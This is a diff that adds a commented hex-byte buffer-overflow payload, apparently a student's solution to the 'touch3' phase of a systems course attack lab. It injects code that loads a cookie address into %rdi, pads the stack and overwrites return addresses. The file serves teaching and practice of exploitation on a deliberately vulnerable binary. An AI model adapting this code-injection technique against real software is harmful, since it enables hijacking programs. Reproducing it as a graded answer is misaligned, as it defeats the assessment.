@@ -1,0 +1,20 @@
+/* Instruction to move address of Cookie to %rdi (rsp - 0x38 + 0x48) */
+48 c7 c7 10 88 63 55 c3
+
+/* Remaining part of buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Set back stack pointer */
+c8 87 63 55 00 00 00 00
+
+/* Return back to touch3  */
+3f 19 40 00 00 00 00 00
+
+/* Cookie */
+35 34 37 35 36 38 32 35
+00
